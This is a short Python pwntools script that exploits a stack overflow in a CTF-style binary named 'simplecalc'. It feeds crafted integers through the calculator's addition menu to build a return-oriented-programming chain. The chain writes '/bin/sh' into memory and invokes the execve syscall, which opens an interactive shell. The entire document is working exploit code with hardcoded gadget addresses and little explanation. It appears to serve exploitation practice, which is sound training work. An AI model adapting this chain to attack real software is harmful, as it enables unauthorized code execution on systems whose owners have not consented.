#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
e = context.binary = ELF("./simplecalc")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
+"\nbreak *0x40154e"
+"\nc"
)

#DEFINE
popRax = 0x44db34
popRdi = 0x401b73
popRsi = 0x401c87
popRdx = 0x437a85
movGadget = 0x44526e
syscall = 0x400488
#END DEFINE

def addSingle(x):
    p.sendlineafter("=>",b"1")
    p.sendlineafter("Integer x:",b"100")
    p.sendlineafter("Integer y:",str(x-100))

def add(z):
  x = z & 0xffffffff
  y = ((z & 0xffffffff00000000) >> 32)
  addSingle(x)
  addSingle(y)
p.sendlineafter('calculations: ',b'100')
for i in range(9):
    add(0x0)


add(popRax)
add(0x6c1000)
add(popRdx)
add(0x0068732f6e69622f) # "/bin/sh" in hex
add(movGadget)

add(popRax) # Specify which syscall to make
add(0x3b)

add(popRdi) # Specify pointer to "/bin/sh"
add(0x6c1000)

add(popRsi) # Specify no arguments or environment variables
add(0x0)
add(popRdx)
add(0x0)
add(syscall)
p.sendlineafter("=>",b"5")
p.interactive()